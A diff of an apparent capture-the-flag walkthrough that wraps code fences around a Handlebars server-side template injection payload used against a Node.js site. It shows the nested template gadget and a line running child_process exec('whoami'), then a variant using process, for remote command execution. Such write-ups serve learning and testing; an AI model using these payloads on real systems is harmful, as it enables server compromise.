@@ -2575,6 +2575,7 @@ In doing some recon, we discover that this is vulnerable to an SSTI(Server Side 
 
 Further browsing the site shows quite a few potential exploits used against Node.js backend libraries. One in particular interest, is the exploit specifically for handlebars:
 
+```
 
 {{#with "s" as |string|}}
   {{#with "e"}}
@@ -2596,6 +2597,7 @@ Further browsing the site shows quite a few potential exploits used against Node
   {{/with}}
 {{/with}}
 
+```
 
 We can try passing this URL encoded text into the form submission to see if we cab perform an SSTI:
 
@@ -2605,15 +2607,18 @@ We can try passing this URL encoded text into the form submission to see if we c
 
 We get an error on the backend about require not being defined:
 
-  
+```
+ 
 {{this.push "return require('child_process').exec('whoami');"}}
 
+```
 
 
 With some knowledge of Node.js, require is not in the global scope and is not accessible here. We can try substituing is for another object that can be passed locally. 
 
 In this case, we can try ```process```:
 
+```
 
 {{#with "s" as |string|}}
   {{#with "e"}}
@@ -2635,7 +2640,7 @@ In this case, we can try ```process```:
   {{/with}}
 {{/with}}
 
-
+```
 
 ![Screenshot_2022-07-25_17_35_51](https://user-images.githubusercontent.com/59018247/180878118-2f12deb4-3c90-44d7-8dda-07149366a2dc.png)
 
